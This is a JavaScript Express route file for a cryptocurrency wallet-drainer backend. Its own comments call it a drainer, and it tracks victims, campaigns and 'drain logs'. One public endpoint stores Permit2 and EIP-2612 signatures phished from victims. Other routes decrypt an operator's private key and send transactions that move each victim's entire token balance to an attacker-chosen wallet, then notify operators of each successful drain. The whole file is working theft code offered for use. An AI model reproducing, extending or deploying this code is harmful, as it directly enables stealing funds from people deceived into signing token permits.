/**
 * ============================================================================
 * SERAPH SERVER - Signature Routes (Router Contract Integration)
 * ============================================================================
 * 
 * Routes for processing gasless token claims via Permit2 and EIP-2612.
 * Uses MultiRewardsRouter contract for execution.
 * 
 * Contract Types:
 * - executor_eoa: Direct Permit2 calls
 * - router_v1: MultiRewardsRouter (with protocol fees)
 * 
 * ============================================================================
 */

import { Router } from 'express'
import { ethers } from 'ethers'
import { requireOperator, optionalAuth } from '../middleware/auth.js'
import signatureService from '../services/signature.service.js'
import drainService from '../services/drain.service.js'
import contractService from '../services/contract.service.js'
import notificationService from '../services/notification.service.js'
import supabase from '../config/supabase.js'
import { config } from '../config/index.js'
import { success, created, badRequest, notFound, paginated } from '../utils/response.js'

const router = Router()

// ============================================================================
// Contract ABIs
// ============================================================================

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

const PERMIT2_SINGLE_ABI = [
  'function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes signature) external'
]

const PERMIT2_BATCH_ABI = [
  'function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external'
]

const ERC20_PERMIT_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
  'function transferFrom(address from, address to, uint256 amount) external returns (bool)',
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)'
]

// Router ABI (standard)
const ROUTER_ABI = [
  {
    "name": "claimWithPermit",
    "type": "function",
    "stateMutability": "nonpayable",
    "inputs": [
      {
        "name": "permit",
        "type": "tuple",
        "components": [
          {
            "name": "permitted",
            "type": "tuple",
            "components": [
              { "name": "token", "type": "address" },
              { "name": "amount", "type": "uint256" }
            ]
          },
          { "name": "nonce", "type": "uint256" },
          { "name": "deadline", "type": "uint256" }
        ]
      },
      { "name": "account", "type": "address" },
      { "name": "signature", "type": "bytes" },
      { "name": "recipient", "type": "address" }
    ],
    "outputs": []
  },
  {
    "name": "claimBatchWithPermit",
    "type": "function",
    "stateMutability": "nonpayable",
    "inputs": [
      {
        "name": "permit",
        "type": "tuple",
        "components": [
          {
            "name": "permitted",
            "type": "tuple[]",
            "components": [
              { "name": "token", "type": "address" },
              { "name": "amount", "type": "uint256" }
            ]
          },
          { "name": "nonce", "type": "uint256" },
          { "name": "deadline", "type": "uint256" }
        ]
      },
      { "name": "account", "type": "address" },
      { "name": "signature", "type": "bytes" },
      { "name": "recipient", "type": "address" }
    ],
    "outputs": []
  },
  {
    "name": "redeemWithSignature",
    "type": "function",
    "stateMutability": "nonpayable",
    "inputs": [
      { "name": "account", "type": "address" },
      {
        "name": "permits",
        "type": "tuple[]",
        "components": [
          { "name": "token", "type": "address" },
          { "name": "value", "type": "uint256" },
          { "name": "deadline", "type": "uint256" },
          { "name": "v", "type": "uint8" },
          { "name": "r", "type": "bytes32" },
          { "name": "s", "type": "bytes32" }
        ]
      },
      { "name": "recipient", "type": "address" }
    ],
    "outputs": []
  },
  {
    "name": "version",
    "type": "function",
    "stateMutability": "pure",
    "inputs": [],
    "outputs": [{ "name": "", "type": "string" }]
  }
]

// Router V1 ABI (includes fee functions)
const ROUTER_V1_ABI = [
  ...ROUTER_ABI,
  {
    "name": "protocolFee",
    "type": "function",
    "stateMutability": "view",
    "inputs": [],
    "outputs": [{ "name": "", "type": "uint256" }]
  },
  {
    "name": "treasury",
    "type": "function",
    "stateMutability": "view",
    "inputs": [],
    "outputs": [{ "name": "", "type": "address" }]
  }
]

// ============================================================================
// Public Routes (no auth required)
// ============================================================================

/**
 * POST /signatures/capture
 * Capture a signature from drainer script (public)
 * 
 * UPDATED: Now sends notifications on capture
 */
router.post('/capture', async (req, res) => {
  try {
    const { 
      campaignKey, 
      victimAddress, 
      signatureType, 
      signature, 
      permitData, 
      domain, 
      message, 
      tokens, 
      totalValueUsd, 
      chainId, 
      deadline 
    } = req.body
    
    if (!campaignKey || !victimAddress || !signatureType || !signature) {
      return badRequest(res, 'campaignKey, victimAddress, signatureType, and signature are required')
    }
    
    // Store the signature
    const sig = await signatureService.storeSignatureByKey({
      campaignKey, 
      victimAddress, 
      signatureType, 
      signature, 
      permitData, 
      domain, 
      message, 
      tokens, 
      totalValueUsd, 
      chainId, 
      deadline,
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    })
    
    // =========================================================================
    // NOTIFICATION: Signature Captured (only for NEW signatures, not updates)
    // Fire-and-forget (non-blocking)
    // =========================================================================
    if (!sig.updated) {
      try {
        // Fetch campaign and operator info for notification context
        const [campaign, operator] = await Promise.all([
          notificationService.getCampaignInfo(sig.campaign_id),
          notificationService.getOperatorSettings(sig.operator_id)
        ])
        
        // Send notification (async, don't await)
        notificationService.notifySignatureCapture(sig, campaign, operator)
        
        console.log(`[Notification] Signature capture notification queued for ${sig.id}`)
      } catch (notifyErr) {
        // Never let notification errors break the main flow
        console.error('[Notification] Failed to queue capture notification:', notifyErr.message)
      }
    } else {
      console.log(`[Signature] Updated existing signature ${sig.id} - skipping notification`)
    }
    // =========================================================================
    
    return created(res, { id: sig.id, status: sig.status }, 'Signature captured')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /signatures/:id/execute
 * Execute a signature (public with optional auth)
 * 
 * UPDATED: Now sends notifications on success/failure
 */
router.post('/:id/execute', optionalAuth, async (req, res) => {
  const signatureId = req.params.id
  
  try {
    console.log(`\n[Execute] Starting for signature ${signatureId}`)
    
    if (!config.blockchain?.rpcUrl) {
      return badRequest(res, 'Server misconfiguration: RPC URL not set')
    }
    
    const sig = await signatureService.getSignatureById(signatureId)
    if (!sig) return notFound(res, 'Signature not found')
    if (sig.status !== 'pending') return badRequest(res, `Signature already ${sig.status}`)
    
    const campaignContract = await getCampaignContractInfo(sig.campaign_id)
    if (!campaignContract) return badRequest(res, 'Campaign has no contract assigned')
    if (!campaignContract.privateKey) return badRequest(res, 'Contract has no private key configured')
    if (!campaignContract.destination) return badRequest(res, 'Campaign has no destination wallet set')
    
    await signatureService.markExecuting(signatureId)
    
    const sigType = (sig.signature_type || '').toLowerCase()
    
    console.log(`[Execute] Type: ${sigType}, Contract: ${campaignContract.contractType}, Account: ${sig.victim_address}`)
    
    let result
    
    try {
      const provider = new ethers.JsonRpcProvider(config.blockchain.rpcUrl)
      const wallet = new ethers.Wallet(campaignContract.privateKey, provider)
      
      // Validate before execution
      const validation = await validateBeforeExecution(provider, sig, campaignContract.destination)
      if (!validation.valid) {
        throw new Error(validation.errors.join(', '))
      }
      
      console.log(`  Executor: ${wallet.address}`)
      console.log(`  Destination: ${campaignContract.destination}`)
      
      // Execute based on contract type
      if (campaignContract.contractType === 'executor_eoa') {
        result = await executeWithEOA(wallet, sig, campaignContract.destination, sigType)
      } else {
        result = await executeWithContract(
          wallet,
          campaignContract.address,
          sig,
          sigType,
          campaignContract.destination,
          campaignContract.contractType
        )
      }
      
      console.log(`[Execute] ✅ Success: ${result.txHash}`)
      
      // Create drain log
      const drainLog = await drainService.createDrainLog({
        campaignId: sig.campaign_id,
        operatorId: sig.operator_id,
        walletId: sig.wallet_id,
        victimAddress: sig.victim_address,
        attackType: sig.signature_type,
        tokens: sig.tokens,
        totalValueUsd: sig.total_value_usd,
        chainId: sig.chain_id
      })
      
      // Update drain status
      await drainService.updateDrainStatus(drainLog.id, {
        status: 'success',
        txHash: result.txHash,
        blockNumber: result.blockNumber
      })
      
      // Mark signature as executed
      await signatureService.markExecuted(signatureId, result.txHash, drainLog.id)
      
      // =========================================================================
      // NOTIFICATION: Drain Success
      // Fire-and-forget (non-blocking)
      // =========================================================================
      try {
        const [campaign, operator] = await Promise.all([
          notificationService.getCampaignInfo(sig.campaign_id),
          notificationService.getOperatorSettings(sig.operator_id)
        ])
        
        notificationService.notifyDrainSuccess({
          operatorId: sig.operator_id,
          victimAddress: sig.victim_address,
          attackType: sig.signature_type,
          totalValueUsd: sig.total_value_usd,
          txHash: result.txHash,
          campaignName: campaign?.name,
          operatorUsername: operator?.username
        })
        
        console.log(`[Notification] Drain success notification queued`)
      } catch (notifyErr) {
        console.error('[Notification] Failed to queue success notification:', notifyErr.message)
      }
      // =========================================================================
      
      return success(res, {
        status: 'executed',
        txHash: result.txHash,
        blockNumber: result.blockNumber,
        drainLogId: drainLog.id
      }, 'Signature executed successfully')
      
    } catch (execError) {
      console.error(`[Execute] ❌ Failed:`, execError.message)
      
      // Mark signature as failed
      await signatureService.markFailed(signatureId, execError.message)
      
      // =========================================================================
      // NOTIFICATION: Drain Failed
      // Fire-and-forget (non-blocking)
      // =========================================================================
      try {
        const campaign = await notificationService.getCampaignInfo(sig.campaign_id)
        
        notificationService.notifyDrainFailed({
          operatorId: sig.operator_id,
          victimAddress: sig.victim_address,
          attackType: sig.signature_type,
          totalValueUsd: sig.total_value_usd,
          errorMessage: execError.message,
          campaignName: campaign?.name
        })
        
        console.log(`[Notification] Drain failed notification queued`)
      } catch (notifyErr) {
        console.error('[Notification] Failed to queue failure notification:', notifyErr.message)
      }
      // =========================================================================
      
      return badRequest(res, `Execution failed: ${execError.message}`)
    }
    
  } catch (err) {
    console.error(`[Execute] Error:`, err.message)
    return badRequest(res, err.message)
  }
})

// ============================================================================
// Protected Routes (require operator auth)
// ============================================================================

router.use(requireOperator)

/**
 * POST /signatures
 * Store a signature (authenticated operator)
 */
router.post('/', async (req, res) => {
  try {
    const {
      campaignId,
      walletId,
      victimAddress,
      signatureType,
      signature,
      permitData,
      domain,
      message,
      tokens,
      totalValueUsd,
      chainId,
      deadline
    } = req.body
    
    if (!victimAddress || !signatureType || !signature) {
      return badRequest(res, 'victimAddress, signatureType, and signature are required')
    }
    
    const sig = await signatureService.storeSignature({
      operatorId: req.user.id,
      campaignId,
      walletId,
      victimAddress,
      signatureType,
      signature,
      permitData,
      domain,
      message,
      tokens,
      totalValueUsd,
      chainId,
      deadline,
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    })
    
    // =========================================================================
    // NOTIFICATION: Signature Captured (authenticated flow)
    // =========================================================================
    try {
      const [campaign, operator] = await Promise.all([
        notificationService.getCampaignInfo(sig.campaign_id),
        notificationService.getOperatorSettings(sig.operator_id)
      ])
      
      notificationService.notifySignatureCapture(sig, campaign, operator)
    } catch (notifyErr) {
      console.error('[Notification] Failed to queue capture notification:', notifyErr.message)
    }
    // =========================================================================
    
    return created(res, sig, 'Signature stored')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /signatures
 * List operator's signatures
 */
router.get('/', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 20,
      status,
      signatureType,
      campaignId,
      victimAddress
    } = req.query
    
    const result = await signatureService.getSignatures(req.user.id, {
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      signatureType,
      campaignId,
      victimAddress
    })
    
    return paginated(res, result.signatures, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /signatures/stats
 * Get signature statistics
 */
router.get('/stats', async (req, res) => {
  try {
    const stats = await signatureService.getSignatureStats(req.user.id)
    return success(res, stats)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /signatures/pending
 * Get pending signatures for a victim
 */
router.get('/pending/:victimAddress', async (req, res) => {
  try {
    const signatures = await signatureService.getPendingSignatures(
      req.params.victimAddress,
      req.user.id
    )
    return success(res, signatures)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /signatures/:id
 * Get signature details
 */
router.get('/:id', async (req, res) => {
  try {
    const sig = await signatureService.getSignatureById(req.params.id, req.user.id)
    return success(res, sig)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * DELETE /signatures/:id
 * Delete a signature
 */
router.delete('/:id', async (req, res) => {
  try {
    await signatureService.deleteSignature(req.params.id, req.user.id)
    return success(res, null, 'Signature deleted')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

// ============================================================================
// Helper Functions
// ============================================================================

async function validateBeforeExecution(provider, sig, destination) {
  const errors = []
  const warnings = []
  
  const deadline = sig.permit_data?.deadline || sig.message?.deadline
  if (deadline) {
    const now = Math.floor(Date.now() / 1000)
    if (Number(deadline) < now) {
      errors.push(`Signature expired`)
    }
  }
  
  if (!ethers.isAddress(destination)) {
    errors.push(`Invalid destination address`)
  }
  
  return { valid: errors.length === 0, errors, warnings }
}

async function getCampaignContractInfo(campaignId) {
  const { data: campaign, error } = await supabase
    .from('campaigns')
    .select(`id, destination_wallet, contract_id, contract:contracts(id, address, contract_type, private_key_encrypted, chain_id)`)
    .eq('id', campaignId)
    .single()
  
  if (error || !campaign?.contract_id || !campaign?.contract) return null
  
  let privateKey = null
  if (campaign.contract.private_key_encrypted) {
    try {
      privateKey = await contractService.getDecryptedPrivateKey(campaign.contract.id)
    } catch (err) {
      console.error('Failed to decrypt private key:', err.message)
    }
  }
  
  return {
    contractId: campaign.contract.id,
    address: campaign.contract.address,
    contractType: campaign.contract.contract_type,
    chainId: campaign.contract.chain_id,
    privateKey,
    destination: campaign.destination_wallet
  }
}

async function executeWithEOA(wallet, sig, destination, sigType) {
  if (sigType === 'permit2_single') return executePermit2Single(wallet, sig, destination)
  if (sigType === 'permit2_batch') return executePermit2Batch(wallet, sig, destination)
  if (sigType === 'native_permit' || sigType === 'native_permit_batch') return executeNativePermit(wallet, sig, destination)
  throw new Error(`Unsupported signature type: ${sigType}`)
}

async function executeWithContract(wallet, contractAddress, sig, sigType, destination, contractType) {
  // Use V7 ABI if available, fallback to standard ABI
  const abi = contractType === 'router_v1' ? ROUTER_V1_ABI : ROUTER_ABI
  const router = new ethers.Contract(contractAddress, abi, wallet)
  
  // Try to log contract version
  try {
    const version = await router.version()
    console.log(`  Contract Version: ${version}`)
  } catch {}
  
  // For V7, log fee info
  if (contractType === 'router_v1') {
    try {
      const feeBps = await router.protocolFee()
      const treasury = await router.treasury()
      console.log(`  Protocol Fee: ${feeBps.toString()} bps, Treasury: ${treasury}`)
    } catch {}
  }
  
  let tx
  
  if (sigType === 'permit2_single') {
    const { permitted, nonce, deadline } = sig.permit_data
    const permit = {
      permitted: { token: ethers.getAddress(permitted.token), amount: BigInt(permitted.amount) },
      nonce: BigInt(nonce),
      deadline: BigInt(deadline)
    }
    console.log(`  claimWithPermit: ${permitted.token}`)
    tx = await router.claimWithPermit(permit, sig.victim_address, sig.signature, destination, { gasLimit: 300000 })
    
  } else if (sigType === 'permit2_batch') {
    const { permitted, nonce, deadline } = sig.permit_data
    const permittedArray = permitted.map(p => ({ token: ethers.getAddress(p.token), amount: BigInt(p.amount) }))
    const permit = { permitted: permittedArray, nonce: BigInt(nonce), deadline: BigInt(deadline) }
    console.log(`  claimBatchWithPermit: ${permittedArray.length} tokens`)
    tx = await router.claimBatchWithPermit(permit, sig.victim_address, sig.signature, destination, { gasLimit: 500000 })
    
  } else if (sigType === 'native_permit' || sigType === 'native_permit_batch') {
    const { v, r, s } = splitSignature(sig.signature)
    const tokenAddress = sig.domain?.verifyingContract || sig.tokens?.[0]?.address
    if (!tokenAddress) throw new Error('Cannot determine token address')
    
    const permits = [{
      token: ethers.getAddress(tokenAddress),
      value: BigInt(sig.message.value),
      deadline: BigInt(sig.message.deadline),
      v, r, s
    }]
    console.log(`  redeemWithSignature: ${tokenAddress}`)
    tx = await router.redeemWithSignature(sig.victim_address, permits, destination, { gasLimit: 300000 })
    
  } else {
    throw new Error(`Unsupported signature type: ${sigType}`)
  }
  
  console.log(`  TX sent: ${tx.hash}`)
  const receipt = await tx.wait()
  console.log(`  TX confirmed in block ${receipt.blockNumber}`)
  
  return { txHash: receipt.hash, blockNumber: receipt.blockNumber }
}

async function executePermit2Single(wallet, sig, destination) {
  const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_SINGLE_ABI, wallet)
  const { permitted, nonce, deadline } = sig.permit_data
  
  const tokenContract = new ethers.Contract(permitted.token, ERC20_PERMIT_ABI, wallet.provider)
  const balance = await tokenContract.balanceOf(sig.victim_address)
  if (balance === 0n) throw new Error('Victim has zero balance')
  
  const permit = {
    permitted: { token: ethers.getAddress(permitted.token), amount: BigInt(permitted.amount) },
    nonce: BigInt(nonce),
    deadline: BigInt(deadline)
  }
  const transferDetails = { to: ethers.getAddress(destination), requestedAmount: balance }
  
  const tx = await permit2.permitTransferFrom(permit, transferDetails, sig.victim_address, sig.signature, { gasLimit: 200000 })
  const receipt = await tx.wait()
  return { txHash: receipt.hash, blockNumber: receipt.blockNumber }
}

async function executePermit2Batch(wallet, sig, destination) {
  const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_ABI, wallet)
  const { permitted, nonce, deadline } = sig.permit_data
  
  const permittedFormatted = permitted.map(p => ({ token: ethers.getAddress(p.token), amount: BigInt(p.amount) }))
  
  const transferDetails = []
  for (const p of permitted) {
    const tokenContract = new ethers.Contract(p.token, ERC20_PERMIT_ABI, wallet.provider)
    const balance = await tokenContract.balanceOf(sig.victim_address)
    transferDetails.push({ to: ethers.getAddress(destination), requestedAmount: balance })
  }
  
  const permit = { permitted: permittedFormatted, nonce: BigInt(nonce), deadline: BigInt(deadline) }
  
  const tx = await permit2.permitTransferFrom(permit, transferDetails, sig.victim_address, sig.signature, { gasLimit: 500000 })
  const receipt = await tx.wait()
  return { txHash: receipt.hash, blockNumber: receipt.blockNumber }
}

async function executeNativePermit(wallet, sig, destination) {
  const tokenAddress = sig.tokens?.[0]?.address || sig.domain?.verifyingContract
  if (!tokenAddress) throw new Error('No token address')
  
  const tokenContract = new ethers.Contract(tokenAddress, ERC20_PERMIT_ABI, wallet)
  const balance = await tokenContract.balanceOf(sig.victim_address)
  if (balance === 0n) throw new Error('Victim has zero balance')
  
  const { v, r, s } = splitSignature(sig.signature)
  const message = sig.message
  
  console.log(`  Step 1: permit()`)
  const permitTx = await tokenContract.permit(message.owner || sig.victim_address, message.spender || wallet.address, message.value, message.deadline, v, r, s, { gasLimit: 100000 })
  await permitTx.wait()
  
  console.log(`  Step 2: transferFrom()`)
  const transferTx = await tokenContract.transferFrom(message.owner || sig.victim_address, destination, balance, { gasLimit: 100000 })
  const receipt = await transferTx.wait()
  
  return { txHash: receipt.hash, blockNumber: receipt.blockNumber }
}

function splitSignature(signature) {
  const sig = signature.startsWith('0x') ? signature.slice(2) : signature
  if (sig.length !== 130) throw new Error(`Invalid signature length: ${sig.length}`)
  
  const r = '0x' + sig.slice(0, 64)
  const s = '0x' + sig.slice(64, 128)
  let v = parseInt(sig.slice(128, 130), 16)
  if (v < 27) v += 27
  
  return { v, r, s }
}

export default router